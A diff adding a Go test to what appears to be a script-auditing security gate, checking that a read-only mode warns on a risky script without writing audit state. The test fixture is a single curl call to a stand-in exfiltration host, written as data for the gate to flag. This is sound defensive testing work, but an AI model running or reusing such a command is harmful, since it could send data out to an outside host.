@@ -105,6 +105,18 @@ func TestGateModes(t *testing.T) {
 	}
 }
 
+func TestGateReadOnlyDoesNotWriteVerdictCache(t *testing.T) {
+	subject := subjectWith(t, "curl https://exfil.example.net/x\n", capabilities.ImplicitNone(), 3)
+	cfg := newCfg(t, "advisory", "high")
+	warnings, errs := GateReadOnly(cfg, []Subject{subject})
+	if len(errs) != 0 || len(warnings) == 0 {
+		t.Fatalf("read-only gate: warnings=%v errs=%v", warnings, errs)
+	}
+	if _, err := os.Stat(filepath.Join(cfg.Home(), "audit")); !os.IsNotExist(err) {
+		t.Fatalf("read-only gate wrote audit state: %v", err)
+	}
+}
+
 func TestRequirePinForOldSchemas(t *testing.T) {
 	subject := subjectWith(t, "echo ok\n", capabilities.ImplicitNone(), 2)
 	cfg := newCfg(t, "strict", "high")
